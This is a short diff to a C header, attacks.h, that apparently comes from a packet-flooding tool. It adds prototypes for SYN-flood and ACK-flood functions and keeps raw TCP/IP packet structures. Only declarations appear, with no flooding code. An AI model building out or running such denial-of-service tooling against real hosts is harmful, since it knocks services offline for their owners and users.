@@ -1,10 +1,7 @@
 #ifndef __ATTACKS_H_
 #define __ATTACKS_H_
 
-unsigned long srchost;
-unsigned int dsthost;
-unsigned short uport;
-unsigned int useconds;
+extern unsigned long srchost;
 
 struct send_tcp {
     struct iphdr ip;
@@ -21,5 +18,10 @@ struct pseudo_header {
     struct tcphdr tcp;
     char buf[20];
 };
+
+void   synflood(sock_t *, unsigned int, unsigned short, int);
+void ngsynflood(sock_t *, unsigned int, unsigned short, int);
+void   ackflood(sock_t *, unsigned int, unsigned short, int);
+void ngackflood(sock_t *, unsigned int, unsigned short, int);
 
 #endif
